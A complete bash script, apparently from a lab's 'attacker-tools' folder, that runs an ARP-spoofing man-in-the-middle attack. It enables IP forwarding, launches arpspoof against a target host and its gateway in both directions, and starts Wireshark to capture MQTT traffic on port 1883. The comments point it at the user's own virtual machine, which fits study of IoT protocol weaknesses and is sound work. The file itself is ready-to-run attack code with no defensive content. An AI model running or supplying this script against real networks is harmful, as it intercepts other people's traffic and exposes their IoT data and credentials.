#!/bin/bash
# attacker-tools/mitm_mqtt.sh
# Usage: sudo ./mitm_mqtt.sh <target_ip> <gateway_ip> <interface>
# Example with your VM:
#   sudo ./mitm_mqtt.sh 10.0.2.15 10.0.2.2 enp0s3

if [ "$#" -ne 3 ]; then
  echo "Usage: sudo $0 <target_ip> <gateway_ip> <interface>"
  exit 1
fi

TARGET=$1         # 10.0.2.15 (your Ubuntu VM)
GATEWAY=$2        # 10.0.2.2  (NAT gateway)
IFACE=$3          # e.g. enp0s3

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof target and gateway
xterm -hold -e "arpspoof -i $IFACE -t $TARGET $GATEWAY" &
xterm -hold -e "arpspoof -i $IFACE -t $GATEWAY $TARGET" &

# Launch Wireshark to capture MQTT traffic (port 1883)
xterm -hold -e "wireshark -k -f 'tcp port 1883' -i $IFACE" &

echo "MITM in progress. Press CTRL+C to stop."

trap 'echo 0 > /proc/sys/net/ipv4/ip_forward; pkill arpspoof; pkill wireshark; exit' INT
